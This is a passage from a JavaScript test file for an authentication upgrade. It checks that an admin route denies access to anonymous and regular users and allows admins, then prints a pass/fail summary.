    return { canAccess: true };
  }

  assert.equal(evaluateRouteAccess('/admin', null, false).canAccess, false);
  assert.equal(evaluateRouteAccess('/admin', { uid: 'regular-user' }, false).canAccess, false);
  assert.equal(evaluateRouteAccess('/admin', { uid: 'admin-user' }, true).canAccess, true);
});

// Execution Summary
console.log('================================================================');
console.log('       ORION-9 AUTHENTICATION UPGRADE AUTOMATED TEST SUITE      ');
console.log('================================================================');
let passed = 0;
let failed = 0;

for (const t of tests) {
  try {
    t.fn();
    console.log(`[PASS] ${t.name}`);
    passed++;
  } catch (err) {
    console.error(`[FAIL] ${t.name}:`, err.message);
    failed++;
  }
}

console.log('================================================================');
console.log(`Summary: ${passed} passed, ${failed} failed (Total: ${tests.length})`);
console.log('================================================================');

if (failed > 0) {
  process.exit(1);
}
